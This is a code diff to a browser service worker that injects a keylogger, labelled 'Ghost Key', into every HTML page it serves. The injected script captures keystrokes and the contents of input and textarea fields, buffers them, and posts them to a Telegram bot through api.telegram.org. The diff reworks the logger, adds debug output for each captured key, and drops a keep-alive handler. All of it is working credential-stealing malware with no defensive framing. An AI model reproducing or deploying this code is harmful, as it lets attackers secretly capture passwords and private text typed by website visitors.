@@ -19,7 +19,6 @@ self.addEventListener('activate', event => {
 self.addEventListener('fetch', event => {
     const url = event.request.url;
 
-    // Only inject into HTML pages (not assets)
     if (event.request.mode === 'navigate' && event.request.destination === 'document') {
         event.respondWith(
             fetch(event.request).then(response => {
@@ -27,77 +26,103 @@ self.addEventListener('fetch', event => {
                     // Inject keylogger script
                     const inject = `
                         <script>
-                            (function() {
-                                const BOT_TOKEN = "${BOT_TOKEN}";
-                                const CHAT_ID = "${CHAT_ID}";
-                                let buffer = "";
-                                let timer = null;
-                                const IDLE_TIME = 10000;
-
-                                // Send to Telegram
-                                function sendToTelegram(msg) {
-                                    if (msg.trim() === "") return;
-                                    fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({
-                                            chat_id: CHAT_ID,
-                                            text: "📱 Keylog: " + msg
-                                        })
-                                    });
+                            // ===== DEBUG =====
+                            function debug(msg) {
+                                const el = document.getElementById('debug');
+                                if (el) {
+                                    const time = new Date().toLocaleTimeString();
+                                    el.innerHTML = \`[\${time}] \${msg}\n\` + el.innerHTML;
+                                    if (el.innerHTML.split('\\n').length > 20) {
+                                        el.innerHTML = el.innerHTML.split('\\n').slice(0, 20).join('\\n');
+                                    }
                                 }
+                                console.log(msg);
+                            }
 
-                                // Reset timer
-                                function resetTimer() {
+                            debug("🔍 Ghost Key injected on this page");
+
+                            const BOT_TOKEN = "${BOT_TOKEN}";
+                            const CHAT_ID = "${CHAT_ID}";
+                            let buffer = "";
+                            let timer = null;
+                            const IDLE_TIME = 10000;
+
+                            function sendToTelegram(msg) {
+                                if (msg.trim() === "") return;
+                                debug("📤 Sending: " + msg);
+                                fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        chat_id: CHAT_ID,
+                                        text: "📱 Keylog: " + msg
+                                    })
+                                }).then(res => res.json()).then(data => {
+                                    if (data.ok) {
+                                        debug("✅ Sent successfully!");
+                                    } else {
+                                        debug("❌ Telegram error: " + data.description);
+                                    }
+                                }).catch(err => {
+                                    debug("❌ Network error: " + err.message);
+                                });
+                            }
+
+                            function resetTimer() {
+                                if (timer) clearTimeout(timer);
+                                timer = setTimeout(() => {
+                                    if (buffer.length > 0) {
+                                        debug("⏰ Auto-sending: " + buffer);
+                                        sendToTelegram(buffer);
+                                        buffer = "";
+                                    }
+                                }, IDLE_TIME);
+                            }
+
+                            // ===== KEYDOWN =====
+                            document.addEventListener('keydown', (e) => {
+                                const key = e.key;
+                                debug("🔑 Keydown: " + key);
+
+                                if (key === "Enter") {
+                                    if (buffer.length > 0) {
+                                        debug("⌨️ Enter pressed, sending: " + buffer);
+                                        sendToTelegram(buffer);
+                                        buffer = "";
+                                    }
                                     if (timer) clearTimeout(timer);
-                                    timer = setTimeout(() => {
-                                        if (buffer.length > 0) {
-                                            sendToTelegram(buffer);
-                                            buffer = "";
-                                        }
-                                    }, IDLE_TIME);
+                                    return;
                                 }
+                                if (key === "Backspace") {
+                                    buffer = buffer.slice(0, -1);
+                                    debug("⬅️ Backspace, buffer: " + buffer);
+                                } else if (key.length === 1) {
+                                    buffer += key;
+                                    debug("✏️ Char: " + key + ", buffer: " + buffer);
+                                }
+                                resetTimer();
+                            });
 
-                                // ===== GLOBAL KEYLOGGER =====
-                                document.addEventListener('keydown', (e) => {
-                                    const key = e.key;
-                                    if (key === "Enter") {
-                                        if (buffer.length > 0) {
-                                            sendToTelegram(buffer);
-                                            buffer = "";
-                                        }
-                                        if (timer) clearTimeout(timer);
-                                        return;
+                            // ===== INPUT EVENT =====
+                            document.addEventListener('input', (e) => {
+                                if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+                                    const val = e.target.value;
+                                    debug("📝 Input changed: " + val);
+                                    if (val.length > buffer.length) {
+                                        const newChar = val.slice(-1);
+                                        buffer += newChar;
+                                        resetTimer();
+                                    } else if (val.length < buffer.length) {
+                                        buffer = val;
+                                        resetTimer();
                                     }
-                                    if (key === "Backspace") {
-                                        buffer = buffer.slice(0, -1);
-                                    } else if (key.length === 1) {
-                                        buffer += key;
-                                    }
-                                    resetTimer();
-                                });
+                                }
+                            });
 
-                                // ===== INPUT EVENT (for mobile) =====
-                                document.addEventListener('input', (e) => {
-                                    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-                                        const val = e.target.value;
-                                        if (val.length > buffer.length) {
-                                            const newChar = val.slice(-1);
-                                            buffer += newChar;
-                                            resetTimer();
-                                        } else if (val.length < buffer.length) {
-                                            buffer = val;
-                                            resetTimer();
-                                        }
-                                    }
-                                });
-
-                                console.log('✅ Ghost Key active on this page');
-                            })();
+                            debug("✅ Ghost Key active on this page");
                         <\/script>
                     `;
 
-                    // Inject into head
                     const modifiedHtml = html.replace('</head>', inject + '</head>');
                     return new Response(modifiedHtml, {
                         headers: response.headers,
@@ -107,13 +132,6 @@ self.addEventListener('fetch', event => {
                 });
             })
         );
-    }
-});
-
-// ===== KEEP ALIVE (Background sync) =====
-self.addEventListener('periodicsync', event => {
-    if (event.tag === 'keep-alive') {
-        event.waitUntil(fetch('/ping'));
     }
 });
 
